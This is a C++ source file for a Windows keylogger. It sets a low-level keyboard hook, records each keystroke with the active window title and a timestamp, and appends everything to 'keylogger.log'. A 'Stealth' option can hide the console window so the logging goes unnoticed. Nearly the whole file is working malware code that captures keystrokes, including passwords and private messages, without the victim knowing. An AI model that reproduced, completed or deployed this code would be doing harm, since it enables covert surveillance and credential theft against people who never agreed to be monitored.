#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{ 
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// Add condition to ignore specific keys
			if (kbdStruct.vkCode == VK_ESCAPE ||
				kbdStruct.vkCode == VK_LSHIFT ||
				kbdStruct.vkCode == VK_RSHIFT ||
				kbdStruct.vkCode == VK_LCONTROL ||
				kbdStruct.vkCode == VK_RCONTROL ||
				kbdStruct.vkCode == VK_RMENU ||
				kbdStruct.vkCode == VK_LMENU ||
				kbdStruct.vkCode == VK_LWIN ||
				kbdStruct.vkCode == VK_RWIN ||
				kbdStruct.vkCode == VK_F1 ||
				kbdStruct.vkCode == VK_F2 ||
				kbdStruct.vkCode == VK_F3 ||
				kbdStruct.vkCode == VK_F4 ||
				kbdStruct.vkCode == VK_F5 ||
				kbdStruct.vkCode == VK_F6 ||
				kbdStruct.vkCode == VK_F7 ||
				kbdStruct.vkCode == VK_F8 ||
				kbdStruct.vkCode == VK_F9 ||
				kbdStruct.vkCode == VK_F10 ||
				kbdStruct.vkCode == VK_F11 ||
				kbdStruct.vkCode == VK_F12 ||
				kbdStruct.vkCode == VK_LEFT ||
				kbdStruct.vkCode == VK_RIGHT ||
				kbdStruct.vkCode == VK_UP ||
				kbdStruct.vkCode == VK_DOWN)
			{
				return CallNextHookEx(_hook, nCode, wParam, lParam); // Skip logging these keys
			}

			Save(kbdStruct.vkCode);
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;

	if (foreground)
	{
		// get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			localtime_s(&tm, &t);
			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

	#if FORMAT == 10
		output << '[' << key_stroke << ']';
	#elif FORMAT == 16
		output << std::hex << "[" << key_stroke << ']';
	#else
		if (key_stroke == VK_SPACE)
		{
			output << ' ';
		}
		else if (keyname.find(key_stroke) != keyname.end())
		{
			output << keyname.at(key_stroke);
		}
		// Attempting to get the backspace key to behave as a backspace key in the log
		else if (key_stroke == VK_BACK)
		{
			// Delete the last character from the log
			std::streampos pos = output_file.tellp();
			output_file.seekp(pos - std::streamoff(1));
			output_file.flush();
			std::cout << "\b \b";  // Move the console cursor back and overwrite the character with a space
			return 0;
		}
		// End
		else
		{
			char key;
			// check caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
				|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
			{
				lowercase = !lowercase;
			}

			// map virtual key according to keyboard layout
			key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

			// tolower converts it to lowercase properly
			if (!lowercase)
			{
				key = tolower(key);
			}
			output << char(key);
		}
	#endif
		// instead of opening and closing file handlers every time, keep file open and flush.
		output_file << output.str();
		output_file.flush();

		std::cout << output.str();

		return 0;
}
void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif
}

int main()
{
	// open output file in append mode
	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	// visibility of window
	Stealth();

	// set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
